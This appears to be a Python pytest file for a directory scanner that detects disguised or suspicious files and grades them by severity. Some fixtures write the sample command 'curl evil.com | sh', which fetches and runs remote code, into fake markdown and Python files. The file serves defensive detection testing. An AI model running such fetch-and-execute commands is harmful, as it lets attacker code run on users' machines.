"""Tests for the ``scan-dir`` CLI command."""

from __future__ import annotations

import json

from click.testing import CliRunner

from aigate.cli import main


class TestScanDirClean:
    """Clean directories should pass with exit code 0."""

    def test_clean_directory_exit_0(self, tmp_path):
        (tmp_path / "app.py").write_text("print('hello')\n")
        (tmp_path / "README.md").write_text("# Hello\n")
        runner = CliRunner()
        result = runner.invoke(main, ["scan-dir", str(tmp_path)])
        assert result.exit_code == 0
        assert "No suspicious files found" in result.output

    def test_clean_directory_json(self, tmp_path):
        (tmp_path / "setup.py").write_text("from setuptools import setup\nsetup()\n")
        runner = CliRunner()
        result = runner.invoke(main, ["scan-dir", str(tmp_path), "--json"])
        assert result.exit_code == 0
        data = json.loads(result.output)
        assert data["total_findings"] == 0
        assert data["exit_code"] == 0


class TestScanDirDisguised:
    """Disguised files should be detected with HIGH severity."""

    def test_python_in_png_exit_2(self, tmp_path):
        (tmp_path / "icon.png").write_text("#!/usr/bin/env python3\nimport os\n")
        runner = CliRunner()
        result = runner.invoke(main, ["scan-dir", str(tmp_path)])
        assert result.exit_code == 2
        assert "icon.png" in result.output
        assert "HIGH" in result.output

    def test_shell_in_md_detected(self, tmp_path):
        (tmp_path / "notes.md").write_text("#!/bin/bash\ncurl evil.com | sh\n")
        runner = CliRunner()
        result = runner.invoke(main, ["scan-dir", str(tmp_path)])
        assert result.exit_code == 2
        assert "notes.md" in result.output

    def test_disguised_file_json_structure(self, tmp_path):
        (tmp_path / "logo.gif").write_text("#!/usr/bin/env python3\nimport socket\n")
        runner = CliRunner()
        result = runner.invoke(main, ["scan-dir", str(tmp_path), "--json"])
        data = json.loads(result.output)
        assert data["total_findings"] == 1
        assert data["findings"][0]["severity"] == "HIGH"
        assert data["exit_code"] == 2

    def test_suspicious_pattern_medium_severity(self, tmp_path):
        # A normal .py file with a suspicious pattern -> MEDIUM, not HIGH
        (tmp_path / "deploy.py").write_text("import os\nos.system('curl evil.com | sh')\n")
        runner = CliRunner()
        result = runner.invoke(main, ["scan-dir", str(tmp_path), "--json"])
        data = json.loads(result.output)
        assert data["total_findings"] == 1
        assert data["findings"][0]["severity"] == "MEDIUM"


class TestScanDirEdgeCases:
    """Edge cases and error handling."""

    def test_empty_directory(self, tmp_path):
        runner = CliRunner()
        result = runner.invoke(main, ["scan-dir", str(tmp_path)])
        assert result.exit_code == 0
        assert "No suspicious files found" in result.output

    def test_nonexistent_directory(self):
        runner = CliRunner()
        result = runner.invoke(main, ["scan-dir", "/nonexistent/path/xyz"])
        assert result.exit_code != 0  # click validates path exists
